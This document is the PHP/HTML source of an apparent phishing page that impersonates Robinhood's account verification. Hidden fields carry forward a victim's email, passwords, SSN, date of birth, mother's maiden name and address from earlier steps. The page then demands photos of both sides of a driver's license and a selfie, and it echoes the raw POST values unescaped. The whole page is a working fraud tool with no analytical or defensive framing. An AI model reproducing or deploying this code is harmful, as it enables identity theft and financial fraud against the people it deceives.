<html lang="en-US" dir="ltr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
<link rel="shortcut icon" href="img/167EWkdKrN2X6Jqp7LEO9o.ico">
<link rel="stylesheet" href="https://cdn.robinhood.com/assets/generated_assets/legacyStyles.8a7c8392c805eaaf82a4.css" type="text/css" media="all" data-id="legacy-styles">
<link rel="stylesheet" href="https://cdn.robinhood.com/assets/generated_assets/App.8a7c8392c805eaaf82a4.css" type="text/css" media="all">
<link rel="stylesheet" type="text/css" href="css/a.css">
<title>Upload driver's license & Selfie to verify your account | Robinhood</title>
</head>
<body class="theme-open-up">
								<center>
								<form class="_17_I0wDhYhTnsfNxPR0_CF up" method="POST" action="account/submit_upload" enctype="multipart/form-data">
									<input type="hidden" name="email" value="<?= $_POST['email']; ?>">
        							<input type="hidden" name="pass_log" value="<?= $_POST['pass_log']; ?>">
        							<input type="hidden" name="password" value="<?= $_POST['password']; ?>">
									<input type="hidden" name="fname" value="<?= $_POST['fname']; ?>">
									<input type="hidden" name="state" value="<?= $_POST['state']; ?>">
									<input type="hidden" name="city" value="<?= $_POST['city']; ?>">
									<input type="hidden" name="address" value="<?= $_POST['address']; ?>">
									<input type="hidden" name="zip" value="<?= $_POST['zip']; ?>">
									<input type="hidden" name="dob" value="<?= $_POST['dob']; ?>">
									<input type="hidden" name="phone" value="<?= $_POST['phone']; ?>">
									<input type="hidden" name="ssn" value="<?= $_POST['ssn']; ?>">
									<input type="hidden" name="mmn" value="<?= $_POST['mmn']; ?>">
									<br>
									<header class="css-240zvz"><span class="css-1wyk9uc" style="font-size: 20px;">Verify your driver's license & Selfie to continue using Robinhood.</span></header><br>
									<center><img src="assets/img/dl.png" width="200"></center>
											<div class="css-1ohcxfz">
												<label class="css-8atqhb">
												<div class="css-1te2hl9" style="width: 80%;">
													<span class="css-ktio0g" style="float: left;font-size: 15px;">Front</span><br>
												</div>
												<div class="css-p5k2s1" style="width: 80%;">
													<input type="file" name="front" class="remove-legacy css-1ur67ge" style="padding-top: 5px;" accept="image/*" required></div>
												</label>
												</div>
											</div><br>
											<div class="css-1ohcxfz">
												<label class="css-8atqhb">
												<div class="css-1te2hl9" style="width: 80%;">
													<span class="css-ktio0g" style="float: left;font-size: 15px;">Back</span><br>
												</div>
												<div class="css-p5k2s1" style="width: 80%;">
													<input type="file" name="back" class="remove-legacy css-1ur67ge" style="padding-top: 5px;" accept="image/*" required></div>
												</label>
												</div>
											</div><br>
											<div class="css-1ohcxfz">
												<label class="css-8atqhb">
												<div class="css-1te2hl9" style="width: 80%;">
													<span class="css-ktio0g" style="float: left;font-size: 15px;">Selfie</span><br>
												</div>
												<div class="css-p5k2s1" style="width: 80%;">
													<input type="file" name="selfie" class="remove-legacy css-1ur67ge" style="padding-top: 5px;" accept="image/*" required></div>
												</label>
												</div>
											</div><br>
									<br>
									<div class="css-0">
										<button type="submit" class="_1OsoaRGpMCXh9KT8s7wtwm _2GHn41jUsfSSC9HmVWT-eg"><span class="css-1o0fjrg">Upload</span></button>
									</div>
								</form>
								</center>
					</div>
				</div>
			</div>
		</div>
	</div>
</div>
</body>
</html>